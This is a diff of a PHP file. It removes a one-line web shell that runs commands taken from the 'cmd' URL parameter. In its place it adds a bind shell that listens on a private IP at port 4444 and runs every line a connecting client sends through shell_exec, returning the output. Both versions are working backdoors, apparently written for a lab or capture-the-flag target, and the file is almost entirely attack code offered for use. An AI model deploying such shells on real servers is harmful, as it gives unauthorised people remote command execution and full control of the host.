@@ -1,7 +1,51 @@
 <?php
-if (isset($_GET['cmd'])) {
-    echo shell_exec($_GET['cmd']);
-} else {
-    echo "No command provided.";
+$ip = '10.10.122.68'; // Bind to all interfaces
+$port = 4444;    // Port to listen on
+
+// Create a TCP socket
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+if ($socket === false) {
+    die("socket_create() failed: " . socket_strerror(socket_last_error()));
 }
+
+// Bind the socket to the IP and port
+if (socket_bind($socket, $ip, $port) === false) {
+    die("socket_bind() failed: " . socket_strerror(socket_last_error($socket)));
+}
+
+// Start listening for incoming connections
+if (socket_listen($socket, 5) === false) {
+    die("socket_listen() failed: " . socket_strerror(socket_last_error($socket)));
+}
+
+echo "Listening on $ip:$port...\n";
+
+while (true) {
+    // Accept incoming connections
+    $client = socket_accept($socket);
+    if ($client === false) {
+        echo "socket_accept() failed: " . socket_strerror(socket_last_error($socket));
+        break;
+    }
+
+    // Get the client address
+    $address = socket_getpeername($client, $ip);
+    echo "Client connected: $ip\n";
+
+    // Execute commands from the client
+    while (true) {
+        $input = socket_read($client, 1024);
+        if ($input === false || $input === "") {
+            break;
+        }
+        $output = shell_exec(trim($input));
+        socket_write($client, $output, strlen($output));
+    }
+
+    // Close the client connection
+    socket_close($client);
+}
+
+// Close the main socket
+socket_close($socket);
 ?>
